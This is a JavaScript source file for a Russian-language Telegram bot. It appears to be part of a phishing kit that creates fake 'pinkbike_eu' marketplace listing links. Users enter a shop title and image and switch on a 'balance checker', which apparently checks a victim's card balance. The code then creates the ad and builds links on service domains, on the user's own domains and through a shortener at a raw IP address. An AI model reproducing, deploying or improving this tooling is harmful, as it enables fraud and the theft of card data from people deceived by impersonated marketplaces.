const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles,MyDomains } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");

const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");
const downloadImage = require("../../helpers/downloadImage");

const scene = new WizardScene(
  "create_link_pinkbike_eu",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "pinkbike_eu",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.scene.state.data = {};
      log(ctx, "перешёл к созданию ссылки PINKBIKE");
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      ctx.scene.state.data.code = 'pinkbike_eu'
      await ctx.scene
        .reply("Введите название магазина", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.title = escapeHTML(ctx.message.text);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
 
  
 
 
  async (ctx) => {
    try {
  
    

      await ctx.scene
        .reply("Отправьте изображение", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Пропустить", "skip")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      // Проверка на нажатие кнопки "Пропустить"
      if (ctx.callbackQuery?.data == "skip") {
        const predefinedPhotoLink = "https://img.freepik.com/premium-photo/verification-badge-icon-on-blue-isolated-background-blue-check-3d-illustration_874734-29.jpg"; // Заранее определенное изображение
        ctx.wizard.state.data.photo = predefinedPhotoLink; // Сохранение ссылки на изображение в состоянии волшебника
        return ctx.wizard.nextStep(); // Переход к следующему шагу
      }
  
      // Логика для обработки отправленного пользователем изображения
      if (ctx.message?.photo?.length < 1) return ctx.wizard.prevStep();
      const photoLink = await ctx.telegram.getFileLink(ctx.message.photo[ctx.message.photo.length - 1].file_id); // Получение ссылки на отправленное изображение
      ctx.wizard.state.data.photo = await downloadImage(photoLink); // Сохранение изображения в состоянии волшебника
      return ctx.wizard.nextStep(); // Переход к следующему шагу
    } catch (err) {
      if (ctx.message?.text) return ctx.wizard.prevStep(); // Возврат к предыдущему шагу, если получено текстовое сообщение
  
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err); // Отправка сообщения об ошибке
      return ctx.scene.leave(); // Выход из сцены
    }
  },
  
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery?.data))
        return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: ctx.scene.state.data.code,
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
                        version: "0",

        balanceChecker: ctx.scene.state.data.balanceChecker,
        photo: ctx.wizard.state.data.photo,
        name: ctx.scene.state.data.name,
        address: ctx.scene.state.data.address,
        price: ctx.scene.state.data.price,
        title: ctx.scene.state.data.title,
        serviceCode: ctx.scene.state.data.code,
      });

      const domains = await MyDomains.findOne({ 
        where: { userId: ctx.from.id }, 
      }); 
       
      let reductionUrl; 
       
      try { 
        const reduction = await axios.post( 
          "http://185.208.158.144/api/create", 
          { 
            target: `https://${service.domain}/${ad.id}`, 
            domain: service.shortlink || ctx.state.bot.shortlink, 
          }, 
          { timeout: 2000 } 
        ); 
       
        reductionUrl = reduction.data.url; 
      } catch (error) { 
        console.error("Ошибка при создании сокращенной ссылки:", error.message); 
       
        if (error.code === 'ECONNABORTED') { 
          console.warn("Запрос превысил допустимый тайм-аут."); 
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') { 
          console.warn("Сервер сокращений недоступен."); 
        } else { 
          console.warn("Произошла непредвиденная ошибка:", error.message); 
        } 
       
        reductionUrl = null; // корректный fallback 
      } 
       
      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null; 
       
      await ad.update({ 
        myDomainLink: personalDomainLink, 
        shortLink: reductionUrl, // используем переменную 
      }); 
       
log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`); 

// Собираем сообщение 
try {
  await myAd(ctx, ad.id);
} catch (err) {
  await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => {});
}
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
    }
  }
);

module.exports = scene;
